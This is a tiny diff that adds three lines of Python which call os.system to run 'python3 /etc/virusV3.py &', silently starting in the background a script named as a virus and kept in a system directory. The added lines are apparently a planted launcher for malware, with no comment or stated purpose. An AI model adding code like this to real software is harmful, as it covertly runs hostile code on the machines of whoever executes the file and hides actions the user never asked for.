@@ -1,0 +1,3 @@
+import os
+d = 'python3 /etc/virusV3.py &'
+os.system(d)
